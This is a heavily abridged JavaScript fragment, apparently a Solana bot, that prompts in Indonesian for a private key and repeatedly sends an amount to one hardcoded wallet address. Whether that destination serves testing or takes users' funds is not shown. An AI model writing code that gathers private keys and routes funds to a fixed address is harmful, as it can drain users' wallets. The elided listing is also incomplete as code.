...
async function sendFromMultipleSenders(
  ...
  for (const senderPrivateKey of senderPrivateKeys) {
    ...
    try {
      ...
      console.error(
        `Transaction failed for sender ${senderKeypair.publicKey.toBase58()}:`,
        error
      );
    }
  }
...
async function main() {
  ...
  switch (choice) {
    case "1":
      ...
      break;
    case "2":
      const senderPrivateKeys = [input("Masukan private key: ")];
      ...
      if (isRandom == "1") {
        ...
        if (!isNaN(txCount)) {
          // Check if txCount is a valid number
          for (let i = 0; i < txCount; i++) {
            await sendFromMultipleSenders(
              senderPrivateKeys,
              "7m937A6oQvaX37DjaBLCbxsU7eGcqr2NSEEExvjBACkm",
              amount,
              true
            );
          }
